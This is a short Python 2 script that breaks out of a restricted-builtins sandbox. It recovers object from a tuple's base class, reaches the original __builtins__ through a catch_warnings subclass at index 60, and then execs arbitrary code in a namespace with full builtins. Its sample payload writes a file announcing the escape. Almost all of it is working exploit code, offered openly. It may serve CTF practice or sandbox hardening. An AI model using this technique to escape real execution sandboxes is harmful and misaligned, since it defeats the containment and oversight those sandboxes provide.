#since object is not in builtins
#get object class from first base class of a tuple
object = ().__class__.__bases__[0]

#get builtins from the catch_warnings subclass
originalBuiltins = object.__subclasses__()[60]()._module.__builtins__

#create a new namespace that contains all the builtins
namespace = {}
namespace['__builtins__'] = originalBuiltins

#exec any code without any restrictions
code = "import sys\n"
code = code + "f = open('escaped.txt', 'w')\n"
code = code + "f.write('I escaped your sandbox!')"

exec code in namespace
